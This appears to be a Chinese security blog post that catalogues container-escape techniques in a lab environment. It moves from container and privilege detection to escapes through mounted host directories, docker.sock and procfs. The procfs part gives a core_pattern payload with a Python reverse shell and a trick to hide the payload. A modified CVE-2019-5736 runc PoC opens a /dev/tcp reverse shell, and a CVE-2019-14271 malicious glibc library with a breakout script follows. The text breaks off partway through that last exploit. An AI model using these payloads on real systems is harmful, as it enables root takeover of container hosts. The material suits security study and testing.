---
title: 容器逃逸
date: 2021-12-27 15:27:12
categories: 云原生安全
tags: 
- 容器安全
---

> 谷神不死，是谓玄牝，玄牝之门，是谓天地根。

容器逃逸相关手法总结

<!-- more -->





## 1. 信息收集

### 1.1 容器识别

> 从 CGroup 信息中，不仅可以判断我们是否在容器内，也能很方便判断出当前的容器是否在 Kubernetes 的编排环境中。

- 命令：cat /proc/1/cgroup

- 结果：

  在k8s环境下:

  ```bash
  root@nginx-demo:/# cat /proc/1/cgroup
  11:cpuset:/kubepods.slice/kubepods-besteffort.slice/kubepods-besteffort-pod7722e1f5_ce02_4c58_8337_7cabc99ad70f.slice/docker-72ad237185cc7bac0114e0ef58bbbd5f288ef638b58bb7ec5b16516d145a37df.scope
  10:cpuacct,cpu:/kubepods.slice/kubepods-besteffort.slice/kubepods-besteffort-pod7722e1f5_ce02_4c58_8337_7cabc99ad70f.slice/docker-72ad237185cc7bac0114e0ef58bbbd5f288ef638b58bb7ec5b16516d145a37df.scope
  9:devices:/kubepods.slice/kubepods-besteffort.slice/kubepods-besteffort-pod7722e1f5_ce02_4c58_8337_7cabc99ad70f.slice/docker-72ad237185cc7bac0114e0ef58bbbd5f288ef638b58bb7ec5b16516d145a37df.scope
  8:blkio:/kubepods.slice/kubepods-besteffort.slice/kubepods-besteffort-pod7722e1f5_ce02_4c58_8337_7cabc99ad70f.slice/docker-72ad237185cc7bac0114e0ef58bbbd5f288ef638b58bb7ec5b16516d145a37df.scope
  ```

  

  容器环境:

  ```bash
  root@250c9269ab90:/# cat /proc/1/cgroup
  11:rdma:/
  10:perf_event:/docker/250c9269ab90f7b9d49913d841aa1f5dd91d317f336b773af151b476301dc48c
  9:devices:/docker/250c9269ab90f7b9d49913d841aa1f5dd91d317f336b773af151b476301dc48c
  8:blkio:/docker/250c9269ab90f7b9d49913d841aa1f5dd91d317f336b773af151b476301dc48c
  7:freezer:/docker/250c9269ab90f7b9d49913d841aa1f5dd91d317f336b773af151b476301dc48c
  ```

  

  - 用到的pod

  ```
  apiVersion: v1
  kind: Pod
  metadata:
    name: nginx-demo
  spec:
    containers:
    - name: nginx-deomo
      image: nginx
  ```

  

### 1.2 特权容器识别

> 开启特权模式（privileged）的容器允许容器访问所有宿主机设备。

- 命令：fdisk -l （特权容器会看到磁盘挂载，无特权容器看不到任何信息）

- 结果：

  正常容器：

  ```bash
  root@250c9269ab90:/# fdisk -l
  root@250c9269ab90:/#
  ```

  特权容器：

  ```bash
  root@bda49fc3063c:/# fdisk -l
  Disk /dev/sda: 41 GiB, 44023414784 bytes, 85983232 sectors
  Disk model: VMware Virtual S
  Units: sectors of 1 * 512 = 512 bytes
  Sector size (logical/physical): 512 bytes / 512 bytes
  I/O size (minimum/optimal): 512 bytes / 512 bytes
  Disklabel type: dos
  Disk identifier: 0x15ec275c
  
  Device     Boot    Start      End  Sectors  Size Id Type
  /dev/sda1  *        2048 83982335 83980288   40G 83 Linux
  /dev/sda2       83984382 85981183  1996802  975M  5 Extended
  /dev/sda5       83984384 85981183  1996800  975M 82 Linux swap / Solaris
  ```

  正常pod:

  ```bash
  / # fdisk -l
  / #
  ```

  特权pod:

  ```bash
  / # fdisk -l
  Disk /dev/sda: 20 GB, 21474836480 bytes, 41943040 sectors
  2610 cylinders, 255 heads, 63 sectors/track
  Units: sectors of 1 * 512 = 512 bytes
  
  Device  Boot StartCHS    EndCHS        StartLBA     EndLBA    Sectors  Size Id Type
  /dev/sda1 *  0,32,33     130,170,40        2048    2099199    2097152 1024M 83 Linux
  /dev/sda2    130,170,41  1023,254,63    2099200   41943039   39843840 18.9G 8e Linux LVM
  Disk /dev/dm-0: 17 GB, 18249416704 bytes, 35643392 sectors
  2218 cylinders, 255 heads, 63 sectors/track
  Units: sectors of 1 * 512 = 512 bytes
  
  Disk /dev/dm-0 doesn't contain a valid partition table
  Disk /dev/dm-1: 2048 MB, 2147483648 bytes, 4194304 sectors
  261 cylinders, 255 heads, 63 sectors/track
  Units: sectors of 1 * 512 = 512 bytes
  ```

  

  

- 使用到的pod

  正常：kubectl exec -it alpine-test /bin/sh

  ```yaml
  apiVersion: v1
  kind: Pod
  metadata:
    name: alpine-test
  spec:
    containers:
    - name: alpine-test
      image: "alpine"
      command: ["/bin/sh", "-c", "tail -f /dev/null"]
  ```

  特权：kubectl exec -it alpine-privileged /bin/sh

  ```
  apiVersion: v1
  kind: Pod
  metadata:
    name: alpine-privileged
  spec:
    containers:
    - name: alpine-privileged
      image: "alpine"
      securityContext:
        privileged: true
      command: ["/bin/sh", "-c", "tail -f /dev/null"]
  ```

  

  

### 1.3 收集挂载信息

> 挂载危险目录可能导致容器逃逸

- 命令：cat /proc/self/mounts

- 结果：

  ```bash
  root@94c7b539e243:/# cat /proc/self/mounts
  overlay / overlay rw,relatime,lowerdir=/var/lib/docker/overlay2/l/ZLTGXOQUKDQSUUEYOU4LEPOTDT:/var/lib/docker/overlay2/l/ACBJV6BUBICY2UWKF6RUSJL2CK:/var/lib/docker/overlay2/l/PEHRSEOSUK5N4LS3TWGFN5AMPF:/var/lib/docker/overlay2/l/WJJQ32N4WYNZPOBCJU6RYNJSZW:/var/lib/docker/overlay2/l/L2WLPD3OB5VQ4BMALKIS7YQZYS:/var/lib/docker/overlay2/l/FKNSIMUASM2XH4VM7NPQTA7LVH:/var/lib/docker/overlay2/l/JLNADHKMD3V6INRNN6XSWIJJTU:/var/lib/docker/overlay2/l/MNMWFARRFGRRJIB2BPJZKKIPL2:/var/lib/docker/overlay2/l/FQT3GCMVXV66A4XDYNO5ZTIPWZ:/var/lib/docker/overlay2/l/NW7UV3VUTVI4HAZMYJYLFNR7DX:/var/lib/docker/overlay2/l/GQBU5K7FNQ6WKYQ4UZKVE34YDF:/var/lib/docker/overlay2/l/NLQIT2NYYWUOKV6X3HU6V2HM4T:/var/lib/docker/overlay2/l/LQUSKZUHCPUZYHYUNJDK2VYSFC,upperdir=/var/lib/docker/overlay2/516dcfd41ed86e852677c6a0a3c58ba7f3b9e7b5898542f4daba5eafe91d34d0/diff,workdir=/var/lib/docker/overlay2/516dcfd41ed86e852677c6a0a3c58ba7f3b9e7b5898542f4daba5eafe91d34d0/work 0 0
  proc /proc proc rw,nosuid,nodev,noexec,relatime 0 0
  tmpfs /dev tmpfs rw,nosuid,size=65536k,mode=755 0 0
  devpts /dev/pts devpts rw,nosuid,noexec,relatime,gid=5,mode=620,ptmxmode=666 0 0
  sysfs /sys sysfs rw,nosuid,nodev,noexec,relatime 0 0
  tmpfs /sys/fs/cgroup tmpfs rw,nosuid,nodev,noexec,relatime,mode=755 0 0
  cgroup /sys/fs/cgroup/systemd cgroup rw,nosuid,nodev,noexec,relatime,xattr,name=systemd 0 0
  cgroup /sys/fs/cgroup/net_cls,net_prio cgroup rw,nosuid,nodev,noe
  ```



### 1.4 收集特权信息

> 有的特权可导致容器逃逸

- 命令：

  ```
  cat /proc/self/status
  或者
  capsh --print
  
  如果没有capsh命令可以
  先：cat /proc/1/status | grep Cap
  获取结果
  然后在自己的机器上进行：capsh --decode=00000000a80425fb
  ```

  结果：

  ```bash
  [root@master testpod]# capsh --print
  Current: = cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,35,36+ep
  Bounding set =cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,35,36
  Securebits: 00/0x0/1'b0
   secure-noroot: no (unlocked
  ```





### 1.5 找到容器在宿主机的根目录

> 找到容器的根目录在很多时候可以帮助我们逃逸，比如在利用procfs挂载进行逃逸的时候

获取当前容器在宿主机的绝对路径

```bash
cat /proc/self/mounts | grep docker
或
cat /proc/mounts | grep docker
```

结果：

```bash
root@d30d39f245c9:/tmp# cat /proc/self/mounts | grep docker
overlay / overlay rw,relatime,lowerdir=/var/lib/docker/overlay2/l/LV2YDJ3G5EYUJN5WKESCKZJMDS:/var/lib/docker/overlay2/l/O34WL63RTLQ5HQEM3T7KBT4ZQ5,upperdir=/var/lib/docker/overlay2/6d0b3e2f5d85784f44f2246a03bb6b9ec066976730ef60ac7b4e4ae16f71874c/diff,workdir=/var/lib/docker/overlay2/6d0b3e2f5d85784f44f2246a03bb6b9ec066976730ef60ac7b4e4ae16f71874c/work 0 0
```

结果中`/var/lib/docker/overlay2/6d0b3e2f5d85784f44f2246a03bb6b9ec066976730ef60ac7b4e4ae16f71874c`就是容器在宿主机的根目录，

在宿主机中我们切换到该目录查看一下

```bash
➜  6d0b3e2f5d85784f44f2246a03bb6b9ec066976730ef60ac7b4e4ae16f71874c ls
diff  link  lower  merged  work
```

==diff: 是我们挂载到容器的目录==

==merged: 容器的根目录==





## 2. 特殊路径挂载导致的容器逃逸

这类的挂载很好理解，当例如宿主机的内的 /, /etc/, /root/.ssh 等目录的写权限被挂载进容器时，在容器内部可以修改宿主机内的 /etc/crontab、/root/.ssh/、/root/.bashrc 等文件执行任意命令，就可以导致容器逃逸。

### 2.1 通过挂载的root目录进行逃逸

```
# 挂载root目录的容器
docker run -it --rm -v /root:/root debian /bin/bash

# 查看挂载信息
cat /proc/self/mounts

#写入ssh公钥
echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDRqTYN4ot1TYFk7Q6wTlUlbyGNau91tMdVAkMrzThzf9u83HqYSYs1rIrguv7ThipBhV0KIRZr02AfHlB2mqKXnMun6fMZlkkVVTPFhUV9aaRNIlRBD84AXncPqktY6uL38a6tZ3nxz/qOtYAl59tjQA2OKLF62ZquUNA2JKw2iIdO+o6r84OqA1nusO2oQP01luK53+w+oKZ30KnDRqy4lzrxkxPApHlwfZKPOdrHkMW/Z0Vj4ZXYjoffJoYOUYCFfR36GwZuxjgxkxwJoitTz0GIZxVnG+rkA5Wi3LatFHBHIZJVyrBVC3bxUFIHESvkpZv/fGCFNLChvAKvPHmD1PbA8V4jGT/hibYmxRPwex5SPq6WMBeZ6a3j4tvCkpLRuv7qTC/JwRaCKx6iyqGntkXCP2G59Kvzxxte7ShgHIMEDyrBNmsb47nUy0o6nUTJ2ThDNIIlPtgouVfw4bJ0Dqr5UhIpMsNJyeAa7VWQCeolvWTxvoLJuR8= ss@MacBook-Pro.local" >> /root/.ssh/authorized_keys

#直接登录
ssh 172.16.42.100
```

挂载的其他目录同理



### 2.2 挂载Docker Socket的情况

其中一个比较特殊且常见的场景是当宿主机的 /var/run/docker.sock 被挂载容器内的时候，容器内就可以通过 docker.sock 在宿主机里创建任意配置的容器，此时可以理解为可以创建任意权限的进程；当然也可以控制任意正在运行的容器。这类的设计被称为： Docker in Docker。常见于需要对当前节点进行容器管理的编排逻辑容器里。

```
#创建挂载Docker Socket的场景
docker run -it --rm --name debiantest -v /var/run/docker.sock:/var/run/docker.sock -v /usr/bin/docker:/usr/bin/docker debian

#查看挂载信息
cat /proc/self/mounts | grep docker

#启动一个挂载根目录的容器
docker run -it -v /:/shadowtest debian /bin/bash

#切换到宿主机根目录
chroot /shadowtest

#查看用户确认挂载成功
# cat /etc/shadow | grep shadowflow
shadowflow:$6$oNvbnhpdcJooQ$N:7:::



```







### 2.3 挂载procfs的情况

procfs是一个伪文件系统，它动态反映着系统内进程及其他组件的状态，其中有许多非常敏感、重要的文件。

一般来说不会将宿主机的procfs挂载到容器中。然而，有些业务为了实现某些特殊需求，还是会将该文件系统挂载进来。

procfs中的/proc/sys/kernel/core_pattern负责配置进程崩溃时内存转储数据的导出方式。从2.6.19内核版本开始，Linux支持在/proc/sys/kernel/core_pattern中使用新语法，如果在该文件中的首个字符是管道符（|），那么该行的剩余内容将被当做用户空间程序或脚本解释并执行。那么我们就可以在管道符后写入后门程序达到命令执行的效果。



1. 创建一个映射proc目录的容器

   ```
   docker run -v /proc:/host_proc --rm -it debian /bin/bash
   ```

   

2. 获取当前容器在宿主机的绝对路径

   ```
   cat /proc/self/mounts | grep docker
   或
   cat /proc/mounts | grep docker
   ```

   结果:

   ```bash
   root@ed4a9a47d52f:/# cat /proc/self/mounts | grep docke
   overlay / overlay rw,relatime,lowerdir=/var/lib/docker/overlay2/l/QKKB57DGVWIT5IAYNN74NHOKIE:/var/lib/docker/overlay2/l/O34WL63RTLQ5HQEM3T7KBT4ZQ5,upperdir=/var/lib/docker/overlay2/a8c0d9490cd90b318c19ff03fd9d1d566bd234ebcb4554b3e58f5aaef1a16206/diff,workdir=/var/lib/docker/overlay2/a8c0d9490cd90b318c19ff03fd9d1d566bd234ebcb4554b3e58f5aaef1a16206/work 0 0
   ```

   根据1.5的知识我们知道容器在宿主机的根目录为：

   ```
   /var/lib/docker/overlay2/a8c0d9490cd90b318c19ff03fd9d1d566bd234ebcb4554b3e58f5aaef1a16206/merged
   ```

   

3. payload改造

   我们不能直接用如下payload：

   `echo -e "|/tmp/.x.py \rcore" >> /proc/sys/kernel/core_pattern`

   因为程序崩溃的时候宿主机是没办法找到容器内的exp的。

   那么我们修改为宿主机目录，并且将proc改为映射的宿主机目录

   ==最终payload如下：==

   ```
   echo -e "|/var/lib/docker/overlay2/a8c0d9490cd90b318c19ff03fd9d1d566bd234ebcb4554b3e58f5aaef1a16206/merged/tmp/.x.py core" >> /host_proc/sys/kernel/core_pattern
   ```

   

   x.py可以写成反弹shell的exp

   ```python
   #!/bin/python
   import os
   import pty
   import socket
   lhost = "172.16.42.100"
   lport = 4444
   def main():
       s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
       s.connect((lhost, lport))
       os.dup2(s.fileno(), 0)
       os.dup2(s.fileno(), 1)
       os.dup2(s.fileno(), 2)
       os.putenv("HISTFILE", '/dv/null')
       pty.spawn("/bin/bash")
       os.remove('/tmp/.x.py')
       s.close()
   if __name__ == "__main__":
       main()
   ```

   将其写入到/tmp/.x.py

   ```python
   cat <<EOF | tee /tmp/.x.py
   #!/bin/python
   import os
   import pty
   import socket
   lhost = "172.16.42.100"
   lport = 4444
   def main():
       s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
       s.connect((lhost, lport))
       os.dup2(s.fileno(), 0)
       os.dup2(s.fileno(), 1)
       os.dup2(s.fileno(), 2)
       os.putenv("HISTFILE", '/dev/null')
       pty.spawn("/bin/bash")
       os.remove('/tmp/.x.py')
       s.close()
   if __name__ == "__main__":
       main()
   EOF
   ```

   ==给python脚本添加权限：chmod 777 /tmp/.x.py==

   

4. 攻击机监听

   ```
   nc -lvvp 4444
   ```

5. 靶机执行最终payload

   ```
   echo -e "|/var/lib/docker/overlay2/a8c0d9490cd90b318c19ff03fd9d1d566bd234ebcb4554b3e58f5aaef1a16206/merged/tmp/.x.py core" >> /host_proc/sys/kernel/core_pattern
   ```

6. 触发payload

   执行一个导致崩溃的程序

   ```c
   #include <stdio.h>
   
   int main(void)
   {
       int *a = NULL;
       *a = 1;
       return 0;
   }
   ```

   ```bash
   gcc a.c -o a
   ./a
   ```

   ```bash
   root@ed4a9a47d52f:/tmp# ./a
   Segmentation fault (core dumped)
   ```

   就会触发执行, 攻击机收到反弹的shell

   ```bash
   [root@master ~]# nc -lvvp 4444
   Ncat: Version 7.50 ( https://nmap.org/ncat )
   Ncat: Listening on :::4444
   Ncat: Listening on 0.0.0.0:4444
   Ncat: Connection from 172.16.42.151.
   Ncat: Connection from 172.16.42.151:37356.
   root@vuln:/#
   ```

   

7. payload优化

   为了隐藏我们的payload，我们做一些修改

   当前：

   ```bash
   root@ed4a9a47d52f:/tmp# cat /host_proc/sys/kernel/core_pattern
   |/var/lib/docker/overlay2/a8c0d9490cd90b318c19ff03fd9d1d566bd234ebcb4554b3e58f5aaef1a16206/merged/tmp/.x.py core
   ```

   由于core_pattern固定字节长度我们可以用/r来覆盖真实的地址

   加入几个空格后的payload:

   ```bash
    echo -e "|/var/lib/docker/overlay2/a8c0d9490cd90b318c19ff03fd9d1d566bd234ebcb4554b3e58f5aaef1a16206/merged/tmp/.x.py \rcore         " > /host_proc/sys/kernel/core_pattern
   ```

   达到混淆的效果:

   ```bash
   root@ed4a9a47d52f:/tmp# cat /host_proc/sys/kernel/core_pattern
   core         ker/overlay2/a8c0d9490cd90b318c19ff03fd9d1d566bd234ebcb4554b3e58f5aaef1a16206/merged/tmp/.x.p
   ```

   





## 3. 利用程序漏洞进行逃逸

我们可以利用容器生态中相关服务端、客户端程序自身存在漏洞进行逃逸

### 3.1 容器运行时

容器运行时负责管理容器运行的整个生命周期，包括但不限于指定容器镜像格式、构建镜像、上传和拉去镜像、管理镜像、管理容器实例、运行容器等。在容器运行早期，Docker作为容器运行时的标准被广泛使用，而后由google、CoreOS、Docker等公司在2015年联合创建了开放容器标准（Open Container Initiative， OCI）,用于推进容器标准化，其主要包含两个标准，分别为容器运行时标准和容器镜像标准，OCI的容器运行时主要包括runC、Rocket、Kata Containers、gVisor等。再后来随着容器编排技术的发展，Kubernetes推出了容器运行时接口(Container Runtime Interface, CRI)，用于与容器运行时进行通讯，从而操作容器化程序。



### 3.2 runC

runC是一个遵循OCI标准的用来运行容器的命令行工具(CLI Tool)，它也是一个Runtime的实现

当我们执行docker info的时候，就可以看见如下内容

```bash
➜  ~ docker info
......
 Runtimes: io.containerd.runc.v2 io.containerd.runtime.v1.linux runc
 Default Runtime: runc
 ......
```

`runC`不仅可以被`docker engine`使用，它也可以单独使用(它本身就是命令行工具)。

### 3.3 CVE-2019-5736 runc容器逃逸漏洞

**影响版本：**

Docker  < 18.09.2

runC <= 1.0-rc6

runC是Docker内置的一个基础客户端工具，在存在漏洞版本的docker中，容器内部通过proc虚拟文件系统访问到runc文件并写入恶意代码，怎么触发呢？触发使用到了proc目录下的/proc/PID/exe，它指向进程自身对应的本地文件。比如如果我们使用docker exec -it /bin/sh，如果我们替换掉容器里的/bin/sh为/proc/[runC-PID]/exe，那么就会调用我们刚刚写入恶意代码的runc，导致恶意命令被执行，由于runc是在docker守护进程里具有宿主机的root权限，相当于逃逸了容器。

**环境搭建：**

使用[metarget](https://github.com/Metarget/metarget/blob/master/README-zh.md)搭建环境(注：要在ubuntu下使用)

```
sudo ./metarget cnv install cve-2019-5736
```

安装好后我们查看docker和runC版本

```bash
shadowflow@ubuntu:~/metarget$ docker version
Client:
 Version:      18.03.1-ce
 API version:  1.37
 Go version:   go1.9.5
 Git commit:   9ee9f40
 Built:        Wed Jun 20 21:43:51 2018
 OS/Arch:      linux/amd64

shadowflow@ubuntu:~/metarget$ docker-runc --version
runc version 1.0.0-rc5
commit: 4fc53a81fb7c994640722ac585fa9ca548971871
spec: 1.0.0

```



下载[poc](https://github.com/Frichetten/CVE-2019-5736-PoC)，修改payload为反弹shell。

```go
package main

// Implementation of CVE-2019-5736
// Created with help from @singe, @_cablethief, and @feexd.
// This commit also helped a ton to understand the vuln
// https://github.com/lxc/lxc/commit/6400238d08cdf1ca20d49bafb85f4e224348bf9d
import (
	"fmt"
	"io/ioutil"
	"os"
	"strconv"
	"strings"
)

// This is the line of shell commands that will execute on the host
//var payload = "#!/bin/bash \n cat /etc/shadow > /tmp/shadow && chmod 777 /tmp/shadow"
var payload = "#!/bin/bash \n bash -i >& /dev/tcp/172.16.42.100/4444 0>&1"

func main() {
	// First we overwrite /bin/sh with the /proc/self/exe interpreter path
	fd, err := os.Create("/bin/sh")
	if err != nil {
		fmt.Println(err)
		return
	}
	fmt.Fprintln(fd, "#!/proc/self/exe")
	err = fd.Close()
	if err != nil {
		fmt.Println(err)
		return
	}
	fmt.Println("[+] Overwritten /bin/sh successfully")

	// Loop through all processes to find one whose cmdline includes runcinit
	// This will be the process created by runc
	var found int
	for found == 0 {
		pids, err := ioutil.ReadDir("/proc")
		if err != nil {
			fmt.Println(err)
			return
		}
		for _, f := range pids {
			fbytes, _ := ioutil.ReadFile("/proc/" + f.Name() + "/cmdline")
			fstring := string(fbytes)
			if strings.Contains(fstring, "runc") {
				fmt.Println("[+] Found the PID:", f.Name())
				found, err = strconv.Atoi(f.Name())
				if err != nil {
					fmt.Println(err)
					return
				}
			}
		}
	}

	// We will use the pid to get a file handle for runc on the host.
	var handleFd = -1
	for handleFd == -1 {
		// Note, you do not need to use the O_PATH flag for the exploit to work.
		handle, _ := os.OpenFile("/proc/"+strconv.Itoa(found)+"/exe", os.O_RDONLY, 0777)
		if int(handle.Fd()) > 0 {
			handleFd = int(handle.Fd())
		}
	}
	fmt.Println("[+] Successfully got the file handle")

	// Now that we have the file handle, lets write to the runc binary and overwrite it
	// It will maintain it's executable flag
	for {
		writeHandle, _ := os.OpenFile("/proc/self/fd/"+strconv.Itoa(handleFd), os.O_WRONLY|os.O_TRUNC, 0700)
		if int(writeHandle.Fd()) > 0 {
			fmt.Println("[+] Successfully got write handle", writeHandle)
			writeHandle.Write([]byte(payload))
			return
		}
	}
}
```

编译poc:

```bash
CGO_ENABLED=0 GOOS=linux GOARCH=amd64 go build main.go
```

**启动一个容器：**

```bash
sudo docker run -it --name debian --rm debian /bin/bash
```

**将poc复制到容器内并运行：**

```bash
docker cp main debian:/main

#容器内运行
/main
```

**启动监听：**

```bash
nc -lvvp 4444
```

**模拟宿主机进入容器：**

```bash
docker exec -it debian /bin/sh
```

*注：这里我进入的时候第一次用/bin/sh，才行，后面用/bin/bash也可以*

**结果：**

```bash
[root@master ~]# nc -lvvp 4444
Ncat: Version 7.50 ( https://nmap.org/ncat )
Ncat: Listening on :::4444
Ncat: Listening on 0.0.0.0:4444
Ncat: Connection from 172.16.42.181.
Ncat: Connection from 172.16.42.181:53510.
bash: cannot set terminal process group (1212): Inappropriate ioctl for device
bash: no job control in this shell
root@ubuntu:/# id
id
uid=0(root) gid=0(root) groups=0(root)
```



### 3.4 CVE-2018-15664:符号链接替换漏洞

影响版本：Docker < 18.06.1-ce-rc2

CVE-2018-15664是一个条件竞争引起的漏洞，当用户执行docker cp命令的时候Docker守护进程会先检查复制的路径，检查的时候如果有容器内部的符号链接，会先解析符号链接，然后放置，等待检查完后进行复制操作。这其中存在一个间隙，如果我们在执行检查之后复制之前，将执行容器内已经解析成路径的符号链接再次替换成一个符号链接，那么复制的时候，宿主机的docker守护进程就会解析的这个符号链接，就会以docker守护进程的权限把容器内的文件复制到宿主机，这个漏洞比较鸡肋。攻击场景局限在非root用户的宿主机权限，并且有docker交互的权限，这时候可以使用这个方法修改/etc/shadow文件实现提权，并且由于需要条件竞争成功率并不高。如果有了这些权限完全可以启动一个特权容器进行逃逸。由于利用条件过于苛刻，实际价值不大，这里不做复现。

### 3.5 CVE-2019-14271:加载不受信任的动态链接

影响版本 Docker 19.03.x 和若干非正式版

在存在漏洞版本的Docker中，在执行Docker cp命令后，Docker守护进程会启动一个docker-tar进程来完成这项复制任务。docker-tar会在容器里执行chroot后加载一些动态链接库，如果我们在容器里放置恶意的动态链接库，就会被加载到容器外的docker-tar(root权限)运行。

**环境搭建：**

```
./metarget cnv install cve-2019-14271
```

**确定目标：**

如何找出docker-tar启动后会加载的容器内动态链接库呢？最直接的是分析docker源码，但是比较费时间；另一种思路是执行一次docker cp命令，观察在这个过程中容器内部哪些动态链接库被加载了。我们采用第二种方式，需要使用inotify机制，用来监控文件系统变化。

1. 启动一个容器：

   ```
   sudo docker run -itd --name=test ubuntu
   ```

2. 确定容器绝对路径：

   ```bash
   shadowflow@ubuntu:~/metarget$ sudo docker exec -it test cat /proc/mounts | grep docker
   overlay / overlay rw,relatime,lowerdir=/var/lib/docker/overlay2/l/OPYJT6AWT3IWJEPHAFYV5KJZCN:/var/lib/docker/overlay2/l/E4IQFOCWDQVZR3SHN5ZEMRI2ZX,upperdir=/var/lib/docker/overlay2/90cb520a4b6ef60f15fcc1b962328150829c0e5fb7c1ecc72f82dfce3d7ff874/diff,workdir=/var/lib/docker/overlay2/90cb520a4b6ef60f15fcc1b962328150829c0e5fb7c1ecc72f82dfce3d7ff874/work,xino=off 0 0
   ```

   根据上文信息收集的内容，可以确定容器根目录为`/var/lib/docker/overlay2/90cb520a4b6ef60f15fcc1b962328150829c0e5fb7c1ecc72f82dfce3d7ff874/merged`

3. 使用inotifywait工具监听容器

   在另一个终端执行监听容器内的lib目录

   ```bash
   shadowflow@ubuntu:~/metarget$ sudo apt install -y inotify-tools
   [sudo] password for shadowflow: 
   Reading package lists... Done
   ......
   
   shadowflow@ubuntu:~/metarget$ sudo inotifywait -mr /var/lib/docker/overlay2/90cb520a4b6ef60f15fcc1b962328150829c0e5fb7c1ecc72f82dfce3d7ff874/merged/lib/
   Setting up watches.  Beware: since -r was given, this may take a while!
   Watches established.
   
   ```

   

4. 执行docker cp

   在原来的终端执行docker cp

   ```bash
   shadowflow@ubuntu:~/metarget$ sudo docker cp test:/etc/passwd ./
   Error response from daemon: error processing tar file: docker-tar: relocation error: /lib/x86_64-linux-gnu/libnss_files.so.2: symbol __libc_readline_unlocked version GLIBC_PRIVATE not defined in file libc.so.6 with link time reference
   : exit status 127
   ```

   监控到以下输出

   ```bash
   shadowflow@ubuntu:~/metarget$ sudo inotifywait -mr /var/lib/docker/overlay2/90cb520a4b6ef60f15fcc1b962328150829c0e5fb7c1ecc72f82dfce3d7ff874/merged/lib/
   Setting up watches.  Beware: since -r was given, this may take a while!
   Watches established.
   /var/lib/docker/overlay2/90cb520a4b6ef60f15fcc1b962328150829c0e5fb7c1ecc72f82dfce3d7ff874/merged/lib/x86_64-linux-gnu/ OPEN libnss_files-2.31.so
   /var/lib/docker/overlay2/90cb520a4b6ef60f15fcc1b962328150829c0e5fb7c1ecc72f82dfce3d7ff874/merged/lib/x86_64-linux-gnu/ ACCESS libnss_files-2.31.so
   /var/lib/docker/overlay2/90cb520a4b6ef60f15fcc1b962328150829c0e5fb7c1ecc72f82dfce3d7ff874/merged/lib/x86_64-linux-gnu/ CLOSE_NOWRITE,CLOSE libnss_files-2.31.so
   
   ```

   我们可以看见docker-tar加载了libnss_files-2.31.so。那么我们就构造一个恶意的libnss_files-2.31.so来替换它。

   

**构造动态链接库：**

先下载[Glibc库](https://ftp.gnu.org/gnu/glibc/)，我这里下载2.31版本https://ftp.gnu.org/gnu/glibc/glibc-2.3.1.tar.gz。最初尝试2.3.1因为和gcc版本和make版本冲突导致编译不成功，换成了《云原生安全：攻防实践与体系构建》立的2.27版

```bash
shadowflow@ubuntu:~$ mkdir ngu
shadowflow@ubuntu:~$ cd ngu
shadowflow@ubuntu:~/ngu$ wget https://ftp.gnu.org/gnu/glibc/glibc-2.27.tar.bz2
shadowflow@ubuntu:~/ngu$ tar -jxvf glibc-2.27.tar.bz2
```

注释编译限制：

```bash
shadowflow@ubuntu:~/ngu$ vim glibc-2.27/Makeconfig
```

注释掉：

```
gccwarn-c = -Wstrict-prototypes -Wold-style-definition
```

添加恶意代码:

```bash
shadowflow@ubuntu:~/ngu$ vim glibc-2.27/nss/nss_files/files-service.c
```

```c
// content should be added into nss/nss_files/files-service.c
#include <sys/types.h>
#include <unistd.h>
#include <stdio.h>
#include <sys/wait.h>

// 容器内部原始 libnss_files.so.2 文件备份位置
#define ORIGINAL_LIBNSS "/original_libnss_files.so.2"
// 恶意 libnss_files.so.2 文件位置
#define LIBNSS_PATH "/lib/x86_64-linux-gnu/libnss_files.so.2"
 
bool is_priviliged();
 
__attribute__ ((constructor)) void run_at_link(void) {
     char * argv_break[2];
  // 判断是否容器外是高权限执行，即 docker-tar
     if (!is_priviliged())
           return;
 
  // 攻击执行一次即可，用原始的替换备份的库文件
  // 避免后续对环境产生影响
     rename(ORIGINAL_LIBNSS, LIBNSS_PATH);
  
    // 以 docker-tar 运行 /breakout 恶意脚本
  	if (!fork()) {
        // Child runs breakout
        argv_break[0] = strdup("/breakout");
        argv_break[1] = NULL;
        execve("/breakout", argv_break, NULL);
     }
     else
        wait(NULL); // Wait for child
 
     return;
}

bool is_priviliged() {
     FILE * proc_file = fopen("/proc/self/exe", "r");
     if (proc_file != NULL) {
           fclose(proc_file);
           return false; // can open so /proc exists, not privileged
     }
     return true; // we're running in the context of docker-tar
}

```



```bash
shadowflow@ubuntu:~/ngu$ mkdir glibc-build
shadowflow@ubuntu:~/ngu$ cd glibc-build/
shadowflow@ubuntu:~/ngu/glibc-build$ sudo apt install bison
shadowflow@ubuntu:~/ngu/glibc-build$ sudo apt install gawk
shadowflow@ubuntu:~/ngu/glibc-build$ sudo ../glibc-2.27/configure --prefix=/home/shadowflow/gnu/glibc-build/configur1/
shadowflow@ubuntu:~/ngu/glibc-build$ sudo make
```

第一次编译比较慢，编译好后恶意文件为`~/ngu/glibc-build/nss/libnss_db.so`

编写exp:

```
shadowflow@ubuntu:~$ vim breakout
```

```shell
#!/bin/bash

umount /host_fs && rm -rf /host_fs
mkdir /host_fs


mount -t proc none /proc     # mount the host's procfs over /proc
cd /proc/1/root              # chdir to host's root
mount --bind . /host_fs      # mount host root at /host_fs
```

启动受害者容器：

```
shadowflow@ubuntu:~$ sudo docker run -itd --name=victim ubuntu
